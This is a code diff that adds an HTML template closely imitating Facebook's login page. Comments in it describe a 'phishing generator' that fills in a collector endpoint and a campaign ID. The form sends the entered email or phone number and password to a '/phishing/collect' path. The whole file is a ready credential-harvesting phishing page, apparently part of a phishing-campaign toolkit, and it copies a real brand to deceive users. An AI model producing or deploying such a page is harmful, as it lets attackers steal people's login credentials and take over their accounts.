@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .fb-container {
+            max-width: 980px;
+            width: 100%;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 40px;
+        }
+
+        .left-panel {
+            flex: 1;
+            min-width: 300px;
+            padding-right: 32px;
+        }
+
+        .left-panel h1 {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: 700;
+            line-height: 1.1;
+            margin-bottom: 10px;
+        }
+
+        .left-panel .tagline {
+            font-size: 28px;
+            font-weight: 400;
+            color: #1c1e21;
+        }
+
+        .right-panel {
+            flex: 1;
+            min-width: 300px;
+            background: white;
+            padding: 20px 20px 24px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: white;
+            transition: border-color 0.2s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+
+        .btn-login {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-link {
+            display: block;
+            text-align: center;
+            margin: 16px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+
+        .btn-create {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+
+        .footer-links {
+            margin-top: 28px;
+            font-size: 14px;
+            color: #737373;
+            text-align: center;
+        }
+
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 768px) {
+            .fb-container {
+                flex-direction: column;
+                text-align: center;
+            }
+            .left-panel {
+                padding-right: 0;
+            }
+            .left-panel h1 {
+                font-size: 48px;
+            }
+            .left-panel .tagline {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="fb-container">
+        <div class="left-panel">
+            <h1>facebook</h1>
+            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right-panel">
+            <!-- The form action will be dynamically replaced by the phishing generator with the collector endpoint -->
+            <form method="post" action="/phishing/collect">
+                <!-- Hidden fields to identify the page and (later) the campaign -->
+                <input type="hidden" name="page" value="facebook">
+                <!-- The campaign ID will be injected by the PHP script when the template is used -->
+                <input type="hidden" name="campaign" value="{{CAMPAIGN_ID}}">
+
+                <div class="form-group">
+                    <input type="text" name="email" placeholder="Email or phone number" required autofocus>
+                </div>
+                <div class="form-group">
+                    <input type="password" name="password" placeholder="Password" required>
+                </div>
+                <button type="submit" class="btn-login">Log In</button>
+                <a href="#" class="forgot-link">Forgotten password?</a>
+                <div class="divider"></div>
+                <button type="button" class="btn-create" onclick="window.location.href='https://www.facebook.com/reg/'">Create new account</button>
+            </form>
+            <div class="footer-links">
+                <a href="https://about.meta.com/">About</a> ·
+                <a href="https://about.instagram.com/">Instagram</a> ·
+                <a href="https://www.meta.com/privacy-policy/">Privacy</a> ·
+                <a href="https://www.facebook.com/policies/cookies/">Cookies</a> ·
+                <a href="https://www.facebook.com/help/">Help</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
